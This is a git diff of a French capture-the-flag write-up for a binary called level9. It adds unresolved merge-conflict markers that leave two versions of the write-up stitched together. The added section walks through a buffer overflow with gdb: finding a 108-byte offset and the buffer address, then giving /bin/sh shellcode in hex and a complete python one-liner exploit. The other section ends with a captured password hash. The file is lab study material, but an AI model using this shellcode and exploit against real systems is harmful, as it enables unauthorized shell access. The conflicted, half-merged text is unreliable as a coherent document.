@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 Le binaire level9 ne retourne rien en particulier
 
 Lancer gdb 
@@ -104,3 +105,50 @@ en accède à un shell
 			$ cat .pass
 			f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 			$ 
+=======
+Grâce à gdb on voit que le binaire fait un memcpy sur un buffer de 100, on peut donc réaliser un buffoverflow.
+Il n'y a pas de call à /bin/sh donc on peut se dire qu'on va faire un shellcode injection
+
+Pour trouver l'adresse on s'aide d'un buffer overflow pattern generator,
+
+
+$ gdb level9
+
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+
+(gdb) info register eax
+eax            0x41366441       1094083649
+
+On utilise 0x41366441 dans notre pattern generator, on a un offset au 108 byte.
+
+On a maintenant notre offset, on peut commencer à créer notre exploit.
+
+
+On explore la stack pour créer notre exploit et trouver l'adresse de début de notre buffer.
+
+(gdb) b *main+136
+Breakpoint 1 at 0x804867c
+
+(gdb) r "AAAA"
+Starting program: /home/user/level9/level9 "AAAA"
+
+Breakpoint 1, 0x0804867c in main ()
+
+(gdb) x $eax
+0x804a00c:      0x41414141
+
+On a donc bien l'adresse de début de notre buffer 0x804a00c, pour finir, notre exploit sera de la forme:
+    shellcode_addr + shellcode + filler + buffer_addr
+
+Le shellcode_addr pointera sur notre shellcode, le filler servira à remplir le buffer afin de provoquer l'overflow et le buffer_addr renverra à notre buffer.
+
+shellcode_addr = buffer_addr+4byte = 0x804a010
+shellcode = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+filler = 108 - len(shellcode_addr) - len(shellcode) = 76
+buffer_addr = 0x0804a00c
+
+./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08"'`
+>>>>>>> 8669a7e5fb63edf774e5a6592acdd662f0a136bf
